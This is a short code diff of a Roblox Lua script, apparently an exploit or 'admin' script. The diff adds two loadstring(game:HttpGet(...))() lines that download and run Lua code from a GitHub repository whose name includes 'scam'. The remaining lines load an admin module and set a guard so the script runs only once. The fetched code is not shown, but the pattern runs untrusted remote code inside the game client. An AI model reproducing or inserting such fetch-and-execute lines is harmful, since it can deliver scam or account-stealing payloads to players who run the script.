@@ -1,4 +1,4 @@
-loadstring(game:HttpGet(" "))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/prexciouis/admpscam/refs/heads/main/script.lua"))()
 wait(1)
 local adm = require(
     game:GetService("ReplicatedStorage")
@@ -69,4 +69,4 @@ if _G.scriptExecuted then
     return
 end
 _G.scriptExecuted = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Prexciouis/admpScam-script/refs/heads/main/AdmpO-(2).lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/prexciouis/admpscam/refs/heads/main/script.lua"))()
